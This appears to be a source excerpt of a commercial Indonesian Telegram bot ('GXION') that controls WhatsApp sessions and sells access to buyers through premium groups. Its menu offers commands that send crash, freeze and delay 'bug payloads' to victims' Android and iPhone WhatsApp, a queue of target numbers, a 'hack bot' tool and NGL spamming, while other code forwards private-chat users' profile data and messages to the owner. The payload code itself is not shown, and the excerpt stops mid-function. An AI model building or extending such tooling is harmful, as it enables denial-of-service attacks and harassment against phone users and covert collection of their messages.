                        [{ text: "❌ Batal", callback_data: "cancel_fsub" }]
                    ]
                }
            }
        );
    }
});

bot.action("cancel_fsub", async (ctx) => {
    await ctx.answerCbQuery("❌ Dibatalakan");
    return ctx.editMessageText("❌ Verifikasi dibatalkan", { reply_markup: { inline_keyboard: [] } });
});

bot.command("helpsub", checkOwner, async (ctx) => {
    return ctx.reply(
`📚 COMMAND FORCE SUBSCRIBE
/start - Mulai bot
/customchannel - Setup force subscribe (1-10 channel)
/setch1 - Setup 1 channel (legacy)
/setch2 - Setup 2 channel (legacy)
/delch - Hapus semua force subscribe
/viewchannels - Lihat daftar channel
/helpsub - Bantuan ini
📌 Catatan:
• Bot harus menjadi admin di semua channel
• Owner tidak terkena force subscribe
• Command yang diblokir sesuai daftar BLOCKED_COMMANDS`);
});

const IMAGES = {
    home: "https://files.catbox.moe/09s22x.jpg"
};

const discoStyles = ["primary", "success", "danger"];

function getDiscoColor() {
    return discoStyles[state.discoIndex];
}

setInterval(async () => {
    state.discoIndex++;
    if (state.discoIndex >= discoStyles.length) state.discoIndex = 0;

    const discoColor = getDiscoColor();
    const updates = [];

    for (const [msgId, data] of state.activeMenus.entries()) {
        try {
            const keyboard = data.keyboardBuilder(discoColor);
            updates.push(
                data.ctx.telegram.editMessageReplyMarkup(
                    data.ctx.chat.id,
                    msgId,
                    undefined,
                    { inline_keyboard: keyboard }
                ).catch(() => {})
            );
        } catch {}
    }

    await Promise.allSettled(updates);
}, 5000);

async function editMenu(ctx, caption, keyboard, page, keyboardBuilder) {
    try {
        const safeCaption = caption.length > 1024 ? caption.substring(0, 1020) + "..." : caption;

        if (ctx.callbackQuery) {
            const msgId = ctx.callbackQuery.message.message_id;

            await ctx.answerCbQuery().catch(() => {});

            try {
                await ctx.telegram.editMessageCaption(
                    ctx.chat.id,
                    msgId,
                    undefined,
                    safeCaption,
                    {
                        parse_mode: "HTML",
                        reply_markup: { inline_keyboard: keyboard }
                    }
                );
            } catch (err) {
                if (err.message && err.message.includes("message is not modified")) {
                } else {
                    try {
                        await ctx.telegram.editMessageMedia(
                            ctx.chat.id,
                            msgId,
                            undefined,
                            {
                                type: "photo",
                                media: IMAGES.home,
                                caption: safeCaption,
                                parse_mode: "HTML"
                            },
                            {
                                reply_markup: { inline_keyboard: keyboard }
                            }
                        );
                    } catch (_) {}
                }
            }

            state.activeMenus.set(msgId, { ctx, caption, page, keyboardBuilder });
            return;
        }

        const sent = await ctx.replyWithPhoto(IMAGES.home, {
            caption: safeCaption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

        state.activeMenus.set(sent.message_id, { ctx, caption, page, keyboardBuilder });
        return sent;

    } catch (err) {
        console.log("EDIT MENU ERROR:", err.message);
        return ctx.answerCbQuery("❌ Gagal memuat menu").catch(() => {});
    }
}

async function sendPage(ctx, page = 0, pages) {
    const total = pages.length;
    if (page < 0) page = 0;
    if (page >= total) page = total - 1;

    const caption = pages[page];
    const keyboardBuilder = (discoColor) => keyboardMenu(discoColor, page, total);
    const keyboard = keyboardBuilder(getDiscoColor());

    return editMenu(ctx, caption, keyboard, page, keyboardBuilder);
}

const keyboardMenu = (discoColor, page, total) => {
    const safeTotal = total || 1;
    const backPage = page <= 0 ? safeTotal - 1 : page - 1;
    const nextPage = page >= safeTotal - 1 ? 0 : page + 1;

    if (page === 0) {
        return [[{
            text: "σpєn scrípt ✿",
            callback_data: "page_1",
            style: "success"
        }]];
    }

    return [[
        {
            text: "Back",
            callback_data: `page_${backPage}`,
            style: "Primary",
            icon_custom_emoji_id: "5267511242305590210"
        },
        {
            text: "HOME",
            callback_data: "page_0",
            style: "Danger",
            icon_custom_emoji_id: "5893431652578758294"
        },
        {
            text: "Next",
            callback_data: `page_${nextPage}`,
            style: "Success",
            icon_custom_emoji_id: "5267490824031061544"
        }
    ]];
};

bot.action(/page_(\d+)/, async (ctx) => {
    try {
        const userId = ctx.from.id;
        const now = Date.now();

        if (state.clickCooldown.has(userId)) {
            const last = state.clickCooldown.get(userId);
            if (now - last < 300) {
                return ctx.answerCbQuery("ᴅᴏɴᴛ sᴘᴀᴍ ⏳", { show_alert: false }).catch(() => {});
            }
        }
        state.clickCooldown.set(userId, now);

        const targetPage = Number(ctx.match[1]);
        const user = ctx.from;
        const username = user.username ? `@${user.username}` : user.first_name || "Tidak Diketahui";

        const pages = getPages({ user, username, chatId: user.id });
        await sendPage(ctx, targetPage, pages);
        await ctx.answerCbQuery().catch(() => {});
    } catch (err) {
        console.log("PAGE ERROR:", err.message);
        await ctx.answerCbQuery("❌ Error").catch(() => {});
    }
});

bot.action("noop", async (ctx) => {
    return ctx.answerCbQuery().catch(() => {});
});

async function notifyOwnerPM(ctx) {
    try {
        if (!ctx.chat || ctx.chat.type !== "private") return;
        if (!ctx.from) return;

        const user = ctx.from;
        const chat = ctx.chat;
        const message = ctx.message || {};
        const chatId = chat.id;
        const userId = user.id;

        const username = user.username ? `@${user.username}` : "Tidak Ada";
        const firstName = user.first_name || "-";
        const lastName = user.last_name || "-";
        const fullName = `${firstName} ${lastName}`.trim() || "Unknown";
        const languageCode = user.language_code || "Unknown";
        const isPremium = user.is_premium ? "✅ Ya" : "❌ Tidak";
        const isBot = user.is_bot ? "✅ Ya" : "❌ Tidak";
        const isVerified = user.is_verified ? "✅ Ya" : "❌ Tidak";
        const isScam = user.is_scam ? "⚠️ Ya" : "✅ Tidak";
        const isFake = user.is_fake ? "⚠️ Ya" : "✅ Tidak";
        const isRestricted = user.is_restricted ? "⚠️ Ya" : "✅ Tidak";

        let pesan = message.text || "[ Pesan Non-Teks ]";
        let tipePesan = "Text";
        let extraInfo = "";

        if (message.photo) {
            tipePesan = "Photo";
            pesan = message.caption || "[ Photo tanpa caption ]";
            const photo = message.photo[message.photo.length - 1];
            extraInfo = `├─ <b>Ukuran</b> : ${photo.file_size || "-"} bytes\n├─ <b>Dimensi</b> : ${photo.width}x${photo.height}\n├─ <b>File ID</b> : <code>${photo.file_id}</code>`;
        } else if (message.video) {
            tipePesan = "Video";
            pesan = message.caption || "[ Video tanpa caption ]";
            extraInfo = `├─ <b>Durasi</b> : ${message.video.duration || "-"}s\n├─ <b>Dimensi</b> : ${message.video.width}x${message.video.height}\n├─ <b>Ukuran</b> : ${message.video.file_size || "-"} bytes`;
        } else if (message.document) {
            tipePesan = "Document";
            pesan = message.caption || "[ Document tanpa caption ]";
            extraInfo = `├─ <b>Nama File</b> : ${message.document.file_name || "-"}\n├─ <b>MIME</b> : ${message.document.mime_type || "-"}\n├─ <b>Ukuran</b> : ${message.document.file_size || "-"} bytes`;
        } else if (message.audio) {
            tipePesan = "Audio";
            pesan = message.caption || "[ Audio tanpa caption ]";
            extraInfo = `├─ <b>Durasi</b> : ${message.audio.duration || "-"}s\n├─ <b>Performer</b> : ${message.audio.performer || "-"}\n├─ <b>Title</b> : ${message.audio.title || "-"}`;
        } else if (message.voice) {
            tipePesan = "Voice Note";
            pesan = "[ Voice Note ]";
            extraInfo = `├─ <b>Durasi</b> : ${message.voice.duration || "-"}s\n├─ <b>MIME</b> : ${message.voice.mime_type || "-"}`;
        } else if (message.sticker) {
            tipePesan = "Sticker";
            pesan = `Emoji: ${message.sticker.emoji || "-"}`;
            extraInfo = `├─ <b>Emoji</b> : ${message.sticker.emoji || "-"}\n├─ <b>Set Name</b> : ${message.sticker.set_name || "-"}\n├─ <b>Animated</b> : ${message.sticker.is_animated ? "✅" : "❌"}\n├─ <b>Video</b> : ${message.sticker.is_video ? "✅" : "❌"}`;
        } else if (message.location) {
            tipePesan = "Location";
            pesan = `Lat: ${message.location.latitude}, Lon: ${message.location.longitude}`;
            extraInfo = `├─ <b>Latitude</b> : ${message.location.latitude}\n├─ <b>Longitude</b> : ${message.location.longitude}\n├─ <b>Maps</b> : <a href="https://maps.google.com/?q=${message.location.latitude},${message.location.longitude}">Buka Maps</a>`;
        } else if (message.contact) {
            tipePesan = "Contact";
            pesan = `${message.contact.first_name} - ${message.contact.phone_number}`;
            extraInfo = `├─ <b>Nama</b> : ${message.contact.first_name || "-"} ${message.contact.last_name || ""}\n├─ <b>Phone</b> : ${message.contact.phone_number || "-"}\n├─ <b>User ID</b> : ${message.contact.user_id || "-"}`;
        } else if (message.animation) {
            tipePesan = "GIF";
            pesan = message.caption || "[ GIF ]";
        } else if (message.poll) {
            tipePesan = "Poll";
            pesan = `${message.poll.question} - ${message.poll.options?.length || 0} opsi`;
        } else if (message.venue) {
            tipePesan = "Venue";
            pesan = `${message.venue.title} - ${message.venue.address}`;
        } else if (message.dice) {
            tipePesan = "Dice";
            pesan = `Value: ${message.dice.value || "-"}`;
        }

        if (pesan.length > 500) {
            pesan = pesan.substring(0, 500) + "...";
        }

        const waktu = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit"
        });

        const uptime = typeof runtime === "function" ? runtime(process.uptime()) : "-";
        const ramUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

        const notif = `
<blockquote><tg-emoji emoji-id="5915814406490427591">🔔</tg-emoji> <b>ADA USER START BOT DI PRIVATE CHAT - PM</b>
━━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="6028497653799588476">🛍</tg-emoji> <b>INFORMASI DETAIL LENGKAP USER</b>
├─ <b>Nama Lengkap</b> : ${fullName}
├─ <b>First Name</b> : ${firstName}
├─ <b>Last Name</b> : ${lastName}
├─ <b>Username</b> : ${username}
├─ <b>User ID</b> : <code>${userId}</code>
├─ <b>Chat ID</b> : <code>${chatId}</code>
├─ <b>Bahasa</b> : ${languageCode}
├─ <b>Premium</b> : ${isPremium}
├─ <b>Bot</b> : ${isBot}
├─ <b>Verified</b> : ${isVerified}
├─ <b>Scam</b> : ${isScam}
├─ <b>Fake</b> : ${isFake}
├─ <b>Restricted</b> : ${isRestricted}
└─ <b>Link Profil</b> : <a href="tg://user?id=${userId}">Klik Disini</a>

<tg-emoji emoji-id="5990174326337310665">🗓</tg-emoji> <b>INFORMASI PESAN</b>
├─ <b>Tipe</b> : ${tipePesan}
├─ <b>Waktu</b> : ${waktu}
├─ <b>Message ID</b> : <code>${message.message_id || "-"}</code>
├─ <b>Via Bot</b> : ${message.via_bot?.username ? "@" + message.via_bot.username : "❌"}
├─ <b>Forwarded</b> : ${message.forward_from ? "✅" : "❌"}
├─ <b>Reply To</b> : ${message.reply_to_message ? "✅" : "❌"}
${extraInfo ? extraInfo + "\n" : ""}└─ <b>Isi Pesan</b> :
<blockquote>${pesan}</blockquote>

<tg-emoji emoji-id="6030595736733749484">✈</tg-emoji> <b>SYSTEM INFO</b>
├─ <b>Uptime</b> : ${uptime}
├─ <b>RAM Used</b> : ${ramUsed} MB</blockquote>
        `.trim();

        let successCount = 0;
        let failCount = 0;

        for (const ownerId of OWNER_ID) {
            try {
                await ctx.telegram.sendMessage(ownerId, notif, {
                    parse_mode: "HTML",
                    disable_web_page_preview: true
                });
                successCount++;
            } catch (err) {
                failCount++;
                console.log(`❌ Gagal kirim ke owner ${ownerId}: ${err.message}`);
            }
        }

        console.log(`Notif terkirim ke ${successCount} owner, gagal ${failCount}`);

    } catch (err) {
        console.log("❌ NOTIFY OWNER ERROR:", err.message);
        console.log("❌ Stack:", err.stack);
    }
}

const getPages = ({ user, username, chatId }) => [
`<blockquote>•.¸♡ 𝗚𝗫𝗜𝗢𝗡 腳本 ♡¸.•
 ∷ ꉣꋬꍌꏂ ꇙ꓄ꋬ꓄꒤ꇙ 1 - 4 ∷
 
/-- مرحباً بكم في سكريبت جي إكسيون --\
# <b>Use Wisely According to Terms of Service</b>
# <b>Thank you for purchasing and using it.</b>

☰ OPTION 情報スクリプト
────────────────────
➻ crєαtєd : @Bawzzhhh
➻ suppσrtєd :  @ikyymaunikah - @Xatanicvxii
➻ vєrsíσn : 49 𝚕𝚊𝚝𝚎𝚜𝚝
➻ sчstєm : Latest Auto-Update
➻ stαtus runníng tímєr   : ${runtime(process.uptime())}

☰ OPTION メッセンジャー
────────────────────
➻ stαtus вσt :  ${getSenderStatus()}
➻ pαíríng : Online 
➻ σpєrαtσr : Ubuntu (Chrome)</blockquote>
`,

`<blockquote>•.¸♡ 𝗚𝗫𝗜𝗢𝗡 腳本 ♡¸.•
 ∷ ꉣꋬꍌꏂ ꇙ꓄ꋬ꓄꒤ꇙ 2 - 4 ∷
 
☰ 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 - コントロール
───────────────────
➤ /addbot ⇢ Add Sender
➤ /killsesi ⇢ Kill Sender/Session
➤ /cekwa ⇢ Cek Session
───────────────────
➤ /setch2 ⇢ Setting 2 Channel
➤ /setch1 ⇢ Setting 1 Channel
➤ /customchannel⇢ Setting Channel Custom
➤ /viewchannels ⇢ Check Daftar Channels
➤ /delch ⇢ Hapus Semua Channel Force Subs 
───────────────────
➤ /pullupdate ⇢ Auto Update Script
➤ /gantibaileys ⇢ Ganti Baileys package.json
➤ /addadmin ⇢ Tambah Admin Akses
➤ /deladmin ⇢ Delete Admin Akses
➤ /addprem ⇢ Tambah premium Akses
➤ /delprem ⇢ Hapus Premium Akses
➤ /lockallcmd ⇢ Kunci Semua Command
➤ /unlockallcmd ⇢ Buka Semua Command
➤ /oncmd ⇢ Atur Aktif Command 
➤ /offcmd ⇢ Atur Off Command 
───────────────────
➤ /reqlink @username ⇢ Verifikasi Buyer Murbug
➤ /autopremgroup ⇢ Tambah Group Premium
➤ /delpremgroup ⇢ Hapus Group Premium
➤ /listgroup ⇢ Daftar Group Akses Premium</blockquote>
`,

`<blockquote>•.¸♡ 𝗚𝗫𝗜𝗢𝗡 腳本 ♡¸.•
 ∷ ꉣꋬꍌꏂ ꇙ꓄ꋬ꓄꒤ꇙ 3 - 4 ∷
 
☰ 𝐓𝐎𝐎𝐋𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 - メニュー
────────────────────
➤ /rasukbot ⇢ Rasuk / Hack Bot
➤ /cekemoji ⇢ Check Premium Emoji ID
➤ /spamngl ⇢ Spam NGL Apps
➤ /brat ⇢ Brat Text Maker
────────────────────
➤ /cekfunction ⇢ Check Your Function
➤ /tiktokdl ⇢ Download TikTok Video
➤ /snack ⇢ Download SnackVideo 
➤ /cekmasadepan ⇢ Random Future Prediction
➤ /ssiphone ⇢ iPhone Theme Screenshot
➤ /cekfunction ⇢ Check Function Error
➤ /jadwalsholat ⇢ Check Prayer Schedule
────────────────────
➤ /trivia ⇢ Kuis pengetahuan umum
➤ /slot ⇢ Judi online games (Fake)
➤ /dadu ⇢ Lempar dadu 
➤ /suit ⇢ Suit games
➤ /typing ⇢ Tes kecepatan mengetik...
➤ /math ⇢ Matematika challenge games>
➤ /koin ⇢ Games koin 
➤ /cuaca ⇢ Check Weather
➤ /time ⇢ Check Indonesia Time</blockquote>
`,

`<blockquote>•.¸♡ 𝗚𝗫𝗜𝗢𝗡 腳本 ♡¸.•
 ∷ ꉣꋬꍌꏂ ꇙ꓄ꋬ꓄꒤ꇙ 4 - 4 ∷
 
/-- مرحباً بكم في سكريبت جي إكسيون --\
# <b>Use Wisely According to Terms of Service</b>
# <b>Thank you for purchasing and using it.</b>
 
<tg-emoji emoji-id="5465206035729906349">🌺</tg-emoji> 𝑰𝑵𝑽𝑰𝑺𝑰𝑩𝑳𝑬 𝑩𝑼𝑮 𝑷𝑨𝒀𝑳𝑶𝑨𝑫 
──────────────────── 
➤ /crashbeta ⇢ Forceclose For Whatsapp Beta
➤ /andromery ⇢ Freeze Invisible Android
➤ /invisXimage ⇢ Send Image To Gallery 
➤ /xctruth ⇢ Bulldozer Delay Android

<tg-emoji emoji-id="5413679274425087559">🚀</tg-emoji> 𝑽𝑰𝑺𝑰𝑩𝑳𝑬 𝑩𝑼𝑮 𝑷𝑨𝒀𝑳𝑶𝑨𝑫 
──────────────────── 
➤ /bannedGroups ⇢ Banned Member Group
➤ /delayquentix⇢ Delay Hard Android Invisible
➤ /delayios ⇢ Delay Iphone
➤ /applex ⇢ Forceclose Iphone 
➤ /combox ⇢ Combo All Payload's
➤ /testfunction ⇢ Testing Bug Code</blockquote>
<blockquote><i>(!) GUNAKAN COMMAND /cekantrian UNTUK MELIHAT ANTRIAN NOMOR YANG AKAN DI EKSEKUSI</i></blockquote>
`
];

bot.command("start", async (ctx) => {
    try {
        if (!OWNER_ID.includes(ctx.from.id)) {
            await notifyOwnerPM(ctx);
        }

        const user = ctx.from;
        const username = user.username ? `@${user.username}` : user.first_name || "Tidak Diketahui";

        const pages = getPages({ user, username, chatId: user.id });
        const total = pages.length;
        const page = 0;

        const keyboardBuilder = (discoColor) => keyboardMenu(discoColor, page, total);
        const keyboard = keyboardBuilder(getDiscoColor());

        const safeCaption = pages[0].length > 1024 ? pages[0].substring(0, 1020) + "..." : pages[0];

        const sent = await ctx.replyWithPhoto(IMAGES.home, {
            caption: safeCaption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

        state.activeMenus.set(sent.message_id, {
            ctx,
            caption: pages[0],
            page,
            keyboardBuilder
        });

    } catch (err) {
        console.log("START ERROR:", err.message);
        await ctx.reply("❌ Gagal memuat menu, coba lagi.").catch(() => {});
    }
});

bot.on("message", async (ctx, next) => {
    try {
        if (
            ctx.chat.type === "private" &&
            !OWNER_ID.includes(ctx.from.id) &&
            ctx.message?.text &&
            !ctx.message.text.startsWith("/")
        ) {
            await notifyOwnerPM(ctx);
        }
    } catch (err) {
        console.log("PM DETECTOR ERROR:", err.message);
    }
    return next();
});

bot.command("pullupdate", checkOwner, async (ctx) => {
    const UPDATE_FILES = [
        { url: "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js", name: "index.js" },
        { url: "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/package.json", name: "package.json" }
    ];

    const DELETE_FILES = ["package-lock.json", ".npm", "node_modules"];

    const loadingMsg = await ctx.reply(
`⚙️ <b>AUTO UPDATE SCRIPT</b>
━━━━━━━━━━━━━━━━━━━━
🔄 [░░░░░░░░░░] 0%
⏳ Memulai proses update...
📑 File index.js & package.json`,
        { parse_mode: "HTML" }
    );

    try {
        for (const file of DELETE_FILES) {
            try {
                const pathFile = `./${file}`;
                if (fs.existsSync(pathFile)) {
                    if (fs.lstatSync(pathFile).isDirectory()) {
                        fs.rmSync(pathFile, { recursive: true, force: true });
                    } else {
                        fs.unlinkSync(pathFile);
                    }
                }
            } catch {}
        }

        for (let i = 0; i < UPDATE_FILES.length; i++) {
            const file = UPDATE_FILES[i];
            const totalFiles = UPDATE_FILES.length;

            await new Promise((resolve, reject) => {
                const fileStream = fs.createWriteStream(`./${file.name}`);
                
                https.get(file.url, (res) => {
                    if (res.statusCode !== 200) {
                        reject(new Error(`HTTP ${res.statusCode}`));
                        return;
                    }

                    const totalSize = parseInt(res.headers['content-length'], 10);
                    let downloaded = 0;
                    let lastUpdate = Date.now();

                    res.on('data', (chunk) => {
                        downloaded += chunk.length;
                        const now = Date.now();
                        
                        if (totalSize > 0 && (now - lastUpdate > 1000 || downloaded === totalSize)) {
                            lastUpdate = now;
                            const percent = Math.floor((downloaded / totalSize) * 100);
                            const overall = Math.floor(((i / totalFiles) * 100) + (percent / totalFiles));
                            
                            const filled = Math.floor(overall / 10);
                            const bar = '█'.repeat(filled) + '░'.repeat(10 - filled);
                            
                            ctx.telegram.editMessageText(
                                loadingMsg.chat.id,
                                loadingMsg.message_id,
                                undefined,
`⚙️ <b>AUTO UPDATE SCRIPT</b>
━━━━━━━━━━━━━━━━━━━━
🔄 [${bar}] ${overall}%
⏳ ${percent < 100 ? 'Mengunduh...' : '✅ Selesai'}`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }
                    });

                    res.pipe(fileStream);
                    fileStream.on('finish', resolve);
                    fileStream.on('error', reject);
                }).on('error', reject);
            });
        }

        await ctx.telegram.editMessageText(
            loadingMsg.chat.id,
            loadingMsg.message_id,
            undefined,
`✅ <b>UPDATE FILE COMPLETE!</b>
━━━━━━━━━━━━━━━━━━━━
📑 File : package.json & index.js
♻️ Status : <i>Auto Restarting Panel...</i>`,
            { parse_mode: "HTML" }
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.telegram.editMessageText(
            loadingMsg.chat.id,
            loadingMsg.message_id,
            undefined,
`❌ <b>UPDATE FAILED!</b>
━━━━━━━━━━━━━━━━━━━━
Error: ${e.message}`,
            { parse_mode: "HTML" }
        );
    }
});

bot.command("spotify", async (ctx) => {
    const chatId = ctx.chat.id;
    const query = ctx.message.text.split(" ").slice(1).join(" ");

    if (!query) {
        return ctx.reply(`🎧 Cara penggunaan:
/spotify judul lagu`);
    }

    const loading = await ctx.reply("🔎 Mencari lagu...");

    try {
        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                undefined,
                "❌ Lagu tidak ditemukan."
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "⬇️ Downloading audio..."
        );

        const fileName = `${Date.now()}.mp3`;
        const filePath = path.join(__dirname, fileName);

        const response = await axios({
            method: "GET",
            url: result.audio.url,
            responseType: "stream"
        });

        const writer = fs.createWriteStream(filePath);

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = `<blockquote>🎧 <b>SPOTIFY MUSIC</b>
🎵 <b>Title</b>      : ${result.title}
🎤 <b>Artis</b>     : ${result.author || "Unknown"}
⏱ <b>Durasi</b>   : ${formatDuration(result.duration)}
📅 <b>Rilis</b>    : ${result.uploadDate || "Unknown"}
🔗 <b>Source</b>     : ${result.source}
────────────────────</blockquote>`;

        await ctx.replyWithAudio(
            {
                source: fs.createReadStream(filePath)
            },
            {
                title: result.title,
                performer: result.author || "Unknown Artist",
                caption,
                parse_mode: "HTML"
            }
        );

        fs.unlinkSync(filePath);

        await ctx.telegram.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            undefined,
            "❌ Terjadi kesalahan saat memproses lagu."
        );
    }
});

bot.command("reqlink", checkOwner, async (ctx) => {
    try {
        if (ctx.chat.type === "private") {
            return ctx.reply("Command ini hanya dapat digunakan di dalam grup.");
        }

        const args = ctx.message.text.trim().split(/\s+/);

        if (args.length < 2) {
            return ctx.reply(
`Usage:
/reqlink @username
Reply command ini pada bukti transaksi buyer.`);
        }

        const target = args[1];
        const reply = ctx.message.reply_to_message;

        if (!reply || (!reply.photo && !reply.document)) {
            return ctx.reply(
`Reply screenshot atau bukti transaksi terlebih dahulu.
Contoh:
/reqlink @username`);
        }

        const me = await ctx.telegram.getMe();
        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, me.id);

        if (botMember.status !== "administrator") {
            return ctx.reply("Bot harus menjadi administrator pada grup ini.");
        }

        if (!botMember.can_invite_users) {
            return ctx.reply("Bot memerlukan izin Invite Users.");
        }

        const loading = await ctx.reply(
`╭────────────────────────╮
        REQUEST LINK
╰────────────────────────╯
Request By
@${ctx.from.username || ctx.from.first_name}
Target
${target}
────────────────────────
Status
Verifying Transaction
▰▱▱▱▱▱▱▱▱▱ 10%`
        );

        for (let i = 20; i <= 100; i += 10) {
            await new Promise(resolve => setTimeout(resolve, 600));

            const filled = i / 10;
            const bar = "▰".repeat(filled) + "▱".repeat(10 - filled);

            await ctx.telegram.editMessageText(
                ctx.chat.id,
                loading.message_id,
                undefined,
`╭────────────────────────╮
        REQUEST LINK
╰────────────────────────╯
Request By
@${ctx.from.username || ctx.from.first_name}
Target
${target}
────────────────────────
Status
Verifying Transaction
${bar} ${i}%`
            ).catch(() => {});
        }

        const invite = await ctx.telegram.createChatInviteLink(ctx.chat.id, {
            member_limit: 1,
            expire_date: Math.floor(Date.now() / 1000) + 600
        });

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
`╭────────────────────────╮
     INVITE LINK GROUP MURBUGS
╰────────────────────────╯
Request By Admin : @${ctx.from.username || ctx.from.first_name}
Target Request : ${target}
────────────────────────
🔗 ${invite.invite_link}
────────────────────────
Status : Success
Maximum Usage :1 User
Expires : 10 Minutes
────────────────────────`,
            { disable_web_page_preview: true }
        );

    } catch (err) {
        console.error(err);
        ctx.reply(`Request Failed ${err.message}`);
    }
});

bot.command('zombies', checkOwner, async (ctx) => {
    const chatId = ctx.chat.id;
    let kicked = 0, deleted = 0, failed = 0, total = 0;

    const statusMsg = await ctx.reply('Scanning zombies...');

    try {
        const admins = await ctx.api.getChatAdministrators(chatId);
        const adminIds = new Set(admins.map(a => a.user.id));
        const count = await ctx.api.getChatMembersCount(chatId);

        for (let i = 0; i < count; i++) {
            try {
                const member = await ctx.api.getChatMember(chatId, i);
                const user = member.user;
                total++;

                if (!adminIds.has(user.id)) {
                    if (user.is_deleted || member.status === 'left' || member.status === 'kicked') {
                        await ctx.api.banChatMember(chatId, user.id);
                        if (user.is_deleted) deleted++;
                        else kicked++;
                    }
                }
            } catch (e) {
                failed++;
            }

            if (total % 100 === 0) {
                await ctx.api.editMessageText(
                    chatId,
                    statusMsg.message_id,
                    `Progres: ${total}/${count}`
                ).catch(() => {});
            }
        }

        await ctx.api.editMessageText(
            chatId,
            statusMsg.message_id,
            `Clear Akun Beku Success Deleted: ${deleted} Kicked: ${kicked} Failed: ${failed} Total: ${total}`
        );

    } catch (error) {
        await ctx.reply(`Error: ${error.message}`);
    }
});

bot.command('setchat', checkOwner, async (ctx) => {
    const chatId = ctx.chat.id;
    const args = ctx.message.text.split(' ');

    if (args.length < 2 || isNaN(args[1])) {
        return ctx.reply('Gunakan: /setchat <detik> (maks 3600 detik / 60 menit)');
    }

    let seconds = parseInt(args[1]);

    if (seconds > 3600) {
        seconds = 3600;
        ctx.reply('Maksimal 60 menit.');
    }

    if (seconds < 0) {
        return ctx.reply('Gak bisa minus, Tuan!');
    }

    try {
        await ctx.api.setChatSlowModeDelay(chatId, seconds);
        
        const minutes = Math.floor(seconds / 60);
        const remainSeconds = seconds % 60;
        let waktu = '';
        if (minutes > 0) waktu += `${minutes} menit `;
        if (remainSeconds > 0) waktu += `${remainSeconds} detik`;

        ctx.reply(`✅ Slowmode diatur ke ${waktu}. Anggota harus nunggu ${waktu} sebelum chat lagi.`);
    } catch (error) {
        ctx.reply(`❌ Gagal: ${error.message} Pastikan bot admin!`);
    }
});

bot.command("autopremgroup", checkOwner, async (ctx) => {
    try {
        if (ctx.chat.type === "private") {
            return ctx.reply("❌ Command ini hanya bisa digunakan di grup.");
        }

        const groupId = ctx.chat.id.toString();
        const groupName = ctx.chat.title || "Unknown";
        const premiumGroups = loadPremiumGroups();
        console.log(`[DEBUG] Sebelum: ${JSON.stringify(premiumGroups)}`);

        if (premiumGroups.includes(groupId)) {
            return ctx.reply(`⚠️ Grup sudah premium. 🆔 ID: ${groupId} 📛 Nama: ${groupName}`);
        }

        premiumGroups.push(groupId);
        savePremiumGroups(premiumGroups);
        state.premiumGroups = premiumGroups;
        console.log(`[DEBUG] Sesudah: ${JSON.stringify(premiumGroups)}`);

        ctx.reply(`✅ Grup berhasil dijadikan premium. 🆔 ID: ${groupId} 📛 Nama: ${groupName}`);
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan.");
    }
});

bot.command("delpremgroup", checkOwner, async (ctx) => {
    try {
        if (ctx.chat.type === "private") {
            return ctx.reply("❌ Command ini hanya bisa digunakan di grup.");
        }

        const groupId = ctx.chat.id.toString();
        const groupName = ctx.chat.title || "Unknown";
        const premiumGroups = loadPremiumGroups();

        if (!premiumGroups.includes(groupId)) {
            return ctx.reply(`⚠️ Grup ini bukan premium. 🆔 ID: ${groupId} 📛 Nama: ${groupName}`);
        }

        const updatedGroups = premiumGroups.filter(id => id !== groupId);
        savePremiumGroups(updatedGroups);
        state.premiumGroups = updatedGroups;

        ctx.reply(`✅ Premium grup berhasil dihapus. 🆔 ID: ${groupId} 📛 Nama: ${groupName}`);
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan.");
    }
});

bot.command("listgroup", checkOwner, async (ctx) => {
    try {
        const premiumGroups = loadPremiumGroups();

        if (!premiumGroups || premiumGroups.length < 1) {
            return ctx.reply(
`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>GROUP PREMIUM NOT FOUND</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
Tidak ada group premium yang terdaftar.
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`,
                { parse_mode: "HTML" }
            );
        }

        let text = `<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>LIST GROUP PREMIUM</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>

`;

        for (let i = 0; i < premiumGroups.length; i++) {
            const groupId = premiumGroups[i];

            try {
                const groupData = await ctx.telegram.getChat(groupId);
                const groupName = groupData.title || "Unknown";

                text += `<blockquote>
<b>${i + 1}. ${groupName}</b>
<b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Premium Active √
</blockquote>
`;

            } catch {
                text += `<blockquote>
<b>${i + 1}. Unknown Group</b>
<b>Id Group :</b> <code>${groupId}</code>
<b>Status :</b> Bot Left / Invalid
</blockquote>
`;
